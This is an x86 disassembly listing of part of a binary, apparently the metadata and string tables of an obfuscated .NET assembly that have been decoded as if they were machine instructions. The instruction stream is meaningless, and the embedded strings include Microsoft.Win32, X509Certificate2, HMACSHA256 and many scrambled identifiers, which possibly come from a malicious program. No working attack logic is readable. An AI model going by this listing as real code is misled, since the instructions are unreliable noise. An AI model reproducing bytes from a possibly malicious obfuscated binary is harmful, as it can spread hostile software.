  407605:	03 f8                	add    %eax,%edi
  407607:	01 00                	add    %eax,(%eax)
  407609:	00 23                	add    %ah,(%ebx)
  40760b:	0b fe                	or     %esi,%edi
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 f1                	add    %dh,%cl
  407611:	02 69 02             	add    0x2(%ecx),%ch
  407614:	00 00                	add    %al,(%eax)
  407616:	c9                   	leave
  407617:	1b 6d 02             	sbb    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	1c 25                	sbb    $0x25,%al
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	ec                   	in     (%dx),%al
  407623:	0d 75 02 00 00       	or     $0x275,%eax
  407628:	cf                   	iret
  407629:	07                   	pop    %es
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 13                	add    %dl,(%ebx)
  407705:	18 06                	sbb    %al,(%esi)
  407707:	18 1e                	sbb    %bl,(%esi)
  407709:	18 ef                	sbb    %ch,%bh
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	9f                   	lahf
  40771b:	24 01                	and    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	bb 23 01 00 00       	mov    $0x123,%ebx
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	27                   	daa
  40772b:	0f 02 00             	lar    (%eax),%eax
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	ff 22                	jmp    *(%edx)
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	2b 11                	sub    (%ecx),%edx
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	8b 17                	mov    (%edi),%edx
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	2b 00                	sub    (%eax),%eax
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	f5                   	cmc
  407777:	0a 00                	or     (%eax),%al
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	06                   	push   %es
  40778b:	19 00                	sbb    %eax,(%eax)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 11                	add    %dl,(%ecx)
  40779f:	15 00 00 00 00       	adc    $0x0,%eax
  4077a4:	04 00                	add    $0x0,%al
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	e9 10 00 00 00       	jmp    0x4077c7
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 67 0b             	add    %ah,0xb(%edi)
  4077c8:	00 00                	add    %al,(%eax)
  4077ca:	00 00                	add    %al,(%eax)
  4077cc:	04 00                	add    $0x0,%al
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 ab 22 00 00 00    	add    %ch,0x22(%ebx)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	50                   	push   %eax
  4077ef:	20 00                	and    %al,(%eax)
  4077f1:	00 00                	add    %al,(%eax)
  4077f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 0c 1c             	add    %cl,(%esp,%ebx,1)
  407804:	00 00                	add    %al,(%eax)
  407806:	00 00                	add    %al,(%eax)
  407808:	0c 00                	or     $0x0,%al
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	6d                   	insl   (%dx),%es:(%edi)
  407848:	6b 6f 31 00          	imul   $0x0,0x31(%edi),%ebp
  40784c:	4d                   	dec    %ebp
  40784d:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407854:	74 2e                	je     0x407884
  407856:	57                   	push   %edi
  407857:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40785e:	55                   	push   %ebp
  40785f:	49                   	dec    %ecx
  407860:	6e                   	outsb  %ds:(%esi),(%dx)
  407861:	74 33                	je     0x407896
  407863:	32 00                	xor    (%eax),%al
  407865:	54                   	push   %esp
  407866:	6f                   	outsl  %ds:(%esi),(%dx)
  407867:	49                   	dec    %ecx
  407868:	6e                   	outsb  %ds:(%esi),(%dx)
  407869:	74 33                	je     0x40789e
  40786b:	32 00                	xor    (%eax),%al
  40786d:	58                   	pop    %eax
  40786e:	35 30 39 43 65       	xor    $0x65433930,%eax
  407873:	72 74                	jb     0x4078e9
  407875:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40787c:	32 00                	xor    (%eax),%al
  40787e:	54                   	push   %esp
  40787f:	6f                   	outsl  %ds:(%esi),(%dx)
  407880:	55                   	push   %ebp
  407881:	49                   	dec    %ecx
  407882:	6e                   	outsb  %ds:(%esi),(%dx)
  407883:	74 36                	je     0x4078bb
  407885:	34 00                	xor    $0x0,%al
  407887:	54                   	push   %esp
  407888:	6f                   	outsl  %ds:(%esi),(%dx)
  407889:	49                   	dec    %ecx
  40788a:	6e                   	outsb  %ds:(%esi),(%dx)
  40788b:	74 36                	je     0x4078c3
  40788d:	34 00                	xor    $0x0,%al
  40788f:	54                   	push   %esp
  407890:	6f                   	outsl  %ds:(%esi),(%dx)
  407891:	55                   	push   %ebp
  407892:	49                   	dec    %ecx
  407893:	6e                   	outsb  %ds:(%esi),(%dx)
  407894:	74 31                	je     0x4078c7
  407896:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40789b:	6e                   	outsb  %ds:(%esi),(%dx)
  40789c:	74 31                	je     0x4078cf
  40789e:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4078a2:	41                   	inc    %ecx
  4078a3:	43                   	inc    %ebx
  4078a4:	53                   	push   %ebx
  4078a5:	48                   	dec    %eax
  4078a6:	41                   	inc    %ecx
  4078a7:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078ad:	74 5f                	je     0x40790e
  4078af:	55                   	push   %ebp
  4078b0:	54                   	push   %esp
  4078b1:	46                   	inc    %esi
  4078b2:	38 00                	cmp    %al,(%eax)
  4078b4:	3c 4d                	cmp    $0x4d,%al
  4078b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b7:	64 75 6c             	fs jne 0x407926
  4078ba:	65 3e 00 6c 6d 6d    	gs add %ch,%ds:0x6d(%ebp,%ebp,2)
  4078c0:	6c                   	insb   (%dx),%es:(%edi)
  4078c1:	61                   	popa
  4078c2:	79 46                	jns    0x40790a
  4078c4:	6c                   	insb   (%dx),%es:(%edi)
  4078c5:	79 62                	jns    0x407929
  4078c7:	68 56 61 41 00       	push   $0x416156
  4078cc:	48                   	dec    %eax
  4078cd:	67 4b                	addr16 dec %ebx
  4078cf:	4a                   	dec    %edx
  4078d0:	75 4f                	jne    0x407921
  4078d2:	64 6c                	fs insb (%dx),%es:(%edi)
  4078d4:	43                   	inc    %ebx
  4078d5:	58                   	pop    %eax
  4078d6:	49                   	dec    %ecx
  4078d7:	72 6b                	jb     0x407944
  4078d9:	50                   	push   %eax
  4078da:	65 41                	gs inc %ecx
  4078dc:	00 4d 4f             	add    %cl,0x4f(%ebp)
  4078df:	52                   	push   %edx
  4078e0:	6b 61 7a 71          	imul   $0x71,0x7a(%ecx),%esp
  4078e4:	42                   	inc    %edx
  4078e5:	75 65                	jne    0x40794c
  4078e7:	41                   	inc    %ecx
  4078e8:	00 6b 58             	add    %ch,0x58(%ebx)
  4078eb:	64 57                	fs push %edi
  4078ed:	64 70 66             	fs jo  0x407956
  4078f0:	6a 6b                	push   $0x6b
  4078f2:	61                   	popa
  4078f3:	7a 46                	jp     0x40793b
  4078f5:	64 46                	fs inc %esi
  4078f7:	51                   	push   %ecx
  4078f8:	67 41                	addr16 inc %ecx
  4078fa:	00 45 74             	add    %al,0x74(%ebp)
  4078fd:	79 48                	jns    0x407947
  4078ff:	52                   	push   %edx
  407900:	57                   	push   %edi
  407901:	72 66                	jb     0x407969
  407903:	74 71                	je     0x407976
  407905:	4a                   	dec    %edx
  407906:	66 6f                	outsw  %ds:(%esi),(%dx)
  407908:	41                   	inc    %ecx
  407909:	00 6a 52             	add    %ch,0x52(%edx)
  40790c:	6a 42                	push   $0x42
  40790e:	6d                   	insl   (%dx),%es:(%edi)
  40790f:	58                   	pop    %eax
  407910:	58                   	pop    %eax
  407911:	76 75                	jbe    0x407988
  407913:	4b                   	dec    %ebx
  407914:	46                   	inc    %esi
  407915:	72 41                	jb     0x407958
  407917:	00 6c 6c 54          	add    %ch,0x54(%esp,%ebp,2)
  40791b:	65 66 50             	gs push %ax
  40791e:	4b                   	dec    %ebx
  40791f:	73 79                	jae    0x40799a
  407921:	41                   	inc    %ecx
  407922:	00 46 45             	add    %al,0x45(%esi)
  407925:	6f                   	outsl  %ds:(%esi),(%dx)
  407926:	69 63 4e 50 49 4b 44 	imul   $0x444b4950,0x4e(%ebx),%esp
  40792d:	42                   	inc    %edx
  40792e:	00 74 75 52          	add    %dh,0x52(%ebp,%esi,2)
  407932:	75 6c                	jne    0x4079a0
  407934:	74 77                	je     0x4079ad
  407936:	6d                   	insl   (%dx),%es:(%edi)
  407937:	48                   	dec    %eax
  407938:	56                   	push   %esi
  407939:	4d                   	dec    %ebp
  40793a:	42                   	inc    %edx
  40793b:	00 73 4e             	add    %dh,0x4e(%ebx)
  40793e:	73 77                	jae    0x4079b7
  407940:	6d                   	insl   (%dx),%es:(%edi)
  407941:	46                   	inc    %esi
  407942:	49                   	dec    %ecx
  407943:	49                   	dec    %ecx
  407944:	62 4c 74 56          	bound  %ecx,0x56(%esp,%esi,2)
  407948:	69 6f 4e 42 00 62 70 	imul   $0x70620042,0x4e(%edi),%ebp
  40794f:	4a                   	dec    %edx
  407950:	45                   	inc    %ebp
  407951:	71 54                	jno    0x4079a7
  407953:	5a                   	pop    %edx
  407954:	78 67                	js     0x4079bd
  407956:	6a 56                	push   $0x56
  407958:	43                   	inc    %ebx
  407959:	52                   	push   %edx
  40795a:	42                   	inc    %edx
  40795b:	00 63 58             	add    %ah,0x58(%ebx)
  40795e:	6b 4d 62 7a          	imul   $0x7a,0x62(%ebp),%ecx
  407962:	54                   	push   %esp
  407963:	4b                   	dec    %ebx
  407964:	50                   	push   %eax
  407965:	48                   	dec    %eax
  407966:	45                   	inc    %ebp
  407967:	56                   	push   %esi
  407968:	42                   	inc    %edx
  407969:	00 56 42             	add    %dl,0x42(%esi)
  40796c:	4f                   	dec    %edi
  40796d:	58                   	pop    %eax
  40796e:	43                   	inc    %ebx
  40796f:	64 75 55             	fs jne 0x4079c7
  407972:	65 48                	gs dec %eax
  407974:	46                   	inc    %esi
  407975:	53                   	push   %ebx
  407976:	67 6c                	insb   (%dx),%es:(%di)
  407978:	42                   	inc    %edx
  407979:	00 5a 71             	add    %bl,0x71(%edx)
  40797c:	78 76                	js     0x4079f4
  40797e:	51                   	push   %ecx
  40797f:	53                   	push   %ebx
  407980:	4d                   	dec    %ebp
  407981:	51                   	push   %ecx
  407982:	6f                   	outsl  %ds:(%esi),(%dx)
  407983:	51                   	push   %ecx
  407984:	6d                   	insl   (%dx),%es:(%edi)
  407985:	42                   	inc    %edx
  407986:	00 56 62             	add    %dl,0x62(%esi)
  407989:	45                   	inc    %ebp
  40798a:	4a                   	dec    %edx
  40798b:	63 79 53             	arpl   %edi,0x53(%ecx)
  40798e:	6e                   	outsb  %ds:(%esi),(%dx)
  40798f:	70 65                	jo     0x4079f6
  407991:	70 42                	jo     0x4079d5
  407993:	00 77 71             	add    %dh,0x71(%edi)
  407996:	50                   	push   %eax
  407997:	44                   	inc    %esp
  407998:	7a 73                	jp     0x407a0d
  40799a:	75 47                	jne    0x4079e3
  40799c:	41                   	inc    %ecx
  40799d:	41                   	inc    %ecx
  40799e:	78 4e                	js     0x4079ee
  4079a0:	71 42                	jno    0x4079e4
  4079a2:	00 53 4d             	add    %dl,0x4d(%ebx)
  4079a5:	58                   	pop    %eax
  4079a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4079a7:	71 4a                	jno    0x4079f3
  4079a9:	43                   	inc    %ebx
  4079aa:	50                   	push   %eax
  4079ab:	41                   	inc    %ecx
  4079ac:	78 42                	js     0x4079f0
  4079ae:	00 47 43             	add    %al,0x43(%edi)
  4079b1:	00 50 41             	add    %dl,0x41(%eax)
  4079b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4079b5:	53                   	push   %ebx
  4079b6:	51                   	push   %ecx
  4079b7:	72 43                	jb     0x4079fc
  4079b9:	6a 43                	push   $0x43
  4079bb:	6d                   	insl   (%dx),%es:(%edi)
  4079bc:	52                   	push   %edx
  4079bd:	48                   	dec    %eax
  4079be:	53                   	push   %ebx
  4079bf:	72 6c                	jb     0x407a2d
  4079c1:	79 43                	jns    0x407a06
  4079c3:	00 4a 72             	add    %cl,0x72(%edx)
  4079c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4079c7:	48                   	dec    %eax
  4079c8:	72 4d                	jb     0x407a17
  4079ca:	42                   	inc    %edx
  4079cb:	56                   	push   %esi
  4079cc:	7a 43                	jp     0x407a11
  4079ce:	00 42 4a             	add    %al,0x4a(%edx)
  4079d1:	51                   	push   %ecx
  4079d2:	48                   	dec    %eax
  4079d3:	77 6f                	ja     0x407a44
  4079d5:	4b                   	dec    %ebx
  4079d6:	44                   	inc    %esp
  4079d7:	67 6e                	outsb  %ds:(%si),(%dx)
  4079d9:	46                   	inc    %esi
  4079da:	41                   	inc    %ecx
  4079db:	44                   	inc    %esp
  4079dc:	00 4d 61             	add    %cl,0x61(%ebp)
  4079df:	70 4e                	jo     0x407a2f
  4079e1:	61                   	popa
  4079e2:	6d                   	insl   (%dx),%es:(%edi)
  4079e3:	65 54                	gs push %esp
  4079e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e6:	4f                   	dec    %edi
  4079e7:	49                   	dec    %ecx
  4079e8:	44                   	inc    %esp
  4079e9:	00 67 65             	add    %ah,0x65(%edi)
  4079ec:	74 5f                	je     0x407a4d
  4079ee:	46                   	inc    %esi
  4079ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f0:	72 6d                	jb     0x407a5f
  4079f2:	61                   	popa
  4079f3:	74 49                	je     0x407a3e
  4079f5:	44                   	inc    %esp
  4079f6:	00 4a 47             	add    %cl,0x47(%edx)
  4079f9:	79 66                	jns    0x407a61
  4079fb:	64 6d                	fs insl (%dx),%es:(%edi)
  4079fd:	52                   	push   %edx
  4079fe:	4f                   	dec    %edi
  4079ff:	73 64                	jae    0x407a65
  407a01:	58                   	pop    %eax
  407a02:	53                   	push   %ebx
  407a03:	44                   	inc    %esp
  407a04:	00 49 4c             	add    %cl,0x4c(%ecx)
  407a07:	68 41 58 62 6d       	push   $0x6d625841
  407a0c:	6d                   	insl   (%dx),%es:(%edi)
  407a0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407a0e:	61                   	popa
  407a0f:	44                   	inc    %esp
  407a10:	00 41 61             	add    %al,0x61(%ecx)
  407a13:	48                   	dec    %eax
  407a14:	4f                   	dec    %edi
  407a15:	45                   	inc    %ebp
  407a16:	6f                   	outsl  %ds:(%esi),(%dx)
  407a17:	42                   	inc    %edx
  407a18:	67 49                	addr16 dec %ecx
  407a1a:	78 66                	js     0x407a82
  407a1c:	44                   	inc    %esp
  407a1d:	00 73 68             	add    %dh,0x68(%ebx)
  407a20:	4b                   	dec    %ebx
  407a21:	7a 6e                	jp     0x407a91
  407a23:	65 49                	gs dec %ecx
  407a25:	52                   	push   %edx
  407a26:	6c                   	insb   (%dx),%es:(%edi)
  407a27:	44                   	inc    %esp
  407a28:	00 75 6e             	add    %dh,0x6e(%ebp)
  407a2b:	63 64 48 50          	arpl   %esp,0x50(%eax,%ecx,2)
  407a2f:	4a                   	dec    %edx
  407a30:	47                   	inc    %edi
  407a31:	57                   	push   %edi
  407a32:	56                   	push   %esi
  407a33:	61                   	popa
  407a34:	46                   	inc    %esi
  407a35:	54                   	push   %esp
  407a36:	72 44                	jb     0x407a7c
  407a38:	00 47 7a             	add    %al,0x7a(%edi)
  407a3b:	73 58                	jae    0x407a95
  407a3d:	68 71 4f 6d 71       	push   $0x716d4f71
  407a42:	66 44                	inc    %sp
  407a44:	45                   	inc    %ebp
  407a45:	00 4a 7a             	add    %cl,0x7a(%edx)
  407a48:	75 59                	jne    0x407aa3
  407a4a:	45                   	inc    %ebp
  407a4b:	63 47 6d             	arpl   %eax,0x6d(%edi)
  407a4e:	52                   	push   %edx
  407a4f:	59                   	pop    %ecx
  407a50:	77 53                	ja     0x407aa5
  407a52:	50                   	push   %eax
  407a53:	45                   	inc    %ebp
  407a54:	00 4a 51             	add    %cl,0x51(%edx)
  407a57:	4a                   	dec    %edx
  407a58:	6c                   	insb   (%dx),%es:(%edi)
  407a59:	75 44                	jne    0x407a9f
  407a5b:	78 47                	js     0x407aa4
  407a5d:	56                   	push   %esi
  407a5e:	57                   	push   %edi
  407a5f:	62 45 00             	bound  %eax,0x0(%ebp)
  407a62:	41                   	inc    %ecx
  407a63:	77 4f                	ja     0x407ab4
  407a65:	5a                   	pop    %edx
  407a66:	73 77                	jae    0x407adf
  407a68:	4b                   	dec    %ebx
  407a69:	48                   	dec    %eax
  407a6a:	65 45                	gs inc %ebp
  407a6c:	00 57 72             	add    %dl,0x72(%edi)
  407a6f:	73 46                	jae    0x407ab7
  407a71:	63 53 77             	arpl   %edx,0x77(%ebx)
  407a74:	42                   	inc    %edx
  407a75:	68 79 48 72 43       	push   $0x43724879
  407a7a:	41                   	inc    %ecx
  407a7b:	66 45                	inc    %bp
  407a7d:	00 42 69             	add    %al,0x69(%edx)
  407a80:	4f                   	dec    %edi
  407a81:	55                   	push   %ebp
  407a82:	45                   	inc    %ebp
  407a83:	54                   	push   %esp
  407a84:	54                   	push   %esp
  407a85:	74 6c                	je     0x407af3
  407a87:	6e                   	outsb  %ds:(%esi),(%dx)
  407a88:	68 45 00 43 57       	push   $0x57430045
  407a8d:	73 56                	jae    0x407ae5
  407a8f:	65 71 6e             	gs jno 0x407b00
  407a92:	76 54                	jbe    0x407ae8
  407a94:	54                   	push   %esp
  407a95:	75 73                	jne    0x407b0a
  407a97:	43                   	inc    %ebx
  407a98:	74 6e                	je     0x407b08
  407a9a:	45                   	inc    %ebp
  407a9b:	00 71 47             	add    %dh,0x47(%ecx)
  407a9e:	57                   	push   %edi
  407a9f:	55                   	push   %ebp
  407aa0:	41                   	inc    %ecx
  407aa1:	4d                   	dec    %ebp
  407aa2:	63 58 55             	arpl   %ebx,0x55(%eax)
  407aa5:	73 69                	jae    0x407b10
  407aa7:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa8:	7a 58                	jp     0x407b02
  407aaa:	4c                   	dec    %esp
  407aab:	51                   	push   %ecx
  407aac:	46                   	inc    %esi
  407aad:	00 7a 72             	add    %bh,0x72(%edx)
  407ab0:	49                   	dec    %ecx
  407ab1:	66 69 68 52 51 70    	imul   $0x7051,0x52(%eax),%bp
  407ab7:	79 61                	jns    0x407b1a
  407ab9:	58                   	pop    %eax
  407aba:	4d                   	dec    %ebp
  407abb:	55                   	push   %ebp
  407abc:	46                   	inc    %esi
  407abd:	00 62 43             	add    %ah,0x43(%edx)
  407ac0:	6a 55                	push   $0x55
  407ac2:	61                   	popa
  407ac3:	59                   	pop    %ecx
  407ac4:	46                   	inc    %esi
  407ac5:	41                   	inc    %ecx
  407ac6:	68 69 62 46 00       	push   $0x466269
  407acb:	4d                   	dec    %ebp
  407acc:	41                   	inc    %ecx
  407acd:	59                   	pop    %ecx
  407ace:	47                   	inc    %edi
  407acf:	43                   	inc    %ebx
  407ad0:	78 42                	js     0x407b14
  407ad2:	6a 42                	push   $0x42
  407ad4:	59                   	pop    %ecx
  407ad5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ad6:	46                   	inc    %esi
  407ad7:	00 7a 56             	add    %bh,0x56(%edx)
  407ada:	43                   	inc    %ebx
  407adb:	6a 67                	push   $0x67
  407add:	48                   	dec    %eax
  407ade:	45                   	inc    %ebp
  407adf:	4f                   	dec    %edi
  407ae0:	75 46                	jne    0x407b28
  407ae2:	00 58 74             	add    %bl,0x74(%eax)
  407ae5:	6b 6b 69 4f          	imul   $0x4f,0x69(%ebx),%ebp
  407ae9:	77 50                	ja     0x407b3b
  407aeb:	6c                   	insb   (%dx),%es:(%edi)
  407aec:	73 65                	jae    0x407b53
  407aee:	4b                   	dec    %ebx
  407aef:	4b                   	dec    %ebx
  407af0:	42                   	inc    %edx
  407af1:	47                   	inc    %edi
  407af2:	00 43 47             	add    %al,0x47(%ebx)
  407af5:	44                   	inc    %esp
  407af6:	66 49                	dec    %cx
  407af8:	52                   	push   %edx
  407af9:	43                   	inc    %ebx
  407afa:	59                   	pop    %ecx
  407afb:	47                   	inc    %edi
  407afc:	4b                   	dec    %ebx
  407afd:	47                   	inc    %edi
  407afe:	00 4d 77             	add    %cl,0x77(%ebp)
  407b01:	4d                   	dec    %ebp
  407b02:	63 65 71             	arpl   %esp,0x71(%ebp)
  407b05:	6a 5a                	push   $0x5a
  407b07:	55                   	push   %ebp
  407b08:	62 61 64             	bound  %esp,0x64(%ecx)
  407b0b:	47                   	inc    %edi
  407b0c:	00 4c 42 50          	add    %cl,0x50(%edx,%eax,2)
  407b10:	52                   	push   %edx
  407b11:	4f                   	dec    %edi
  407b12:	4d                   	dec    %ebp
  407b13:	78 4b                	js     0x407b60
  407b15:	6e                   	outsb  %ds:(%esi),(%dx)
  407b16:	68 66 45 4b 65       	push   $0x654b4566
  407b1b:	47                   	inc    %edi
  407b1c:	00 57 6c             	add    %dl,0x6c(%edi)
  407b1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b20:	79 62                	jns    0x407b84
  407b22:	62 59 42             	bound  %ebx,0x42(%ecx)
  407b25:	67 67 47             	addr16 addr16 inc %edi
  407b28:	00 7a 50             	add    %bh,0x50(%edx)
  407b2b:	64 58                	fs pop %eax
  407b2d:	59                   	pop    %ecx
  407b2e:	78 46                	js     0x407b76
  407b30:	69 59 4a 6c 47 00 6e 	imul   $0x6e00476c,0x4a(%ecx),%ebx
  407b37:	45                   	inc    %ebp
  407b38:	48                   	dec    %eax
  407b39:	74 76                	je     0x407bb1
  407b3b:	4c                   	dec    %esp
  407b3c:	47                   	inc    %edi
  407b3d:	62 57 71             	bound  %edx,0x71(%edi)
  407b40:	47                   	inc    %edi
  407b41:	00 64 43 70          	add    %ah,0x70(%ebx,%eax,2)
  407b45:	56                   	push   %esi
  407b46:	43                   	inc    %ebx
  407b47:	6c                   	insb   (%dx),%es:(%edi)
  407b48:	54                   	push   %esp
  407b49:	7a 46                	jp     0x407b91
  407b4b:	4c                   	dec    %esp
  407b4c:	77 47                	ja     0x407b95
  407b4e:	00 76 48             	add    %dh,0x48(%esi)
  407b51:	79 47                	jns    0x407b9a
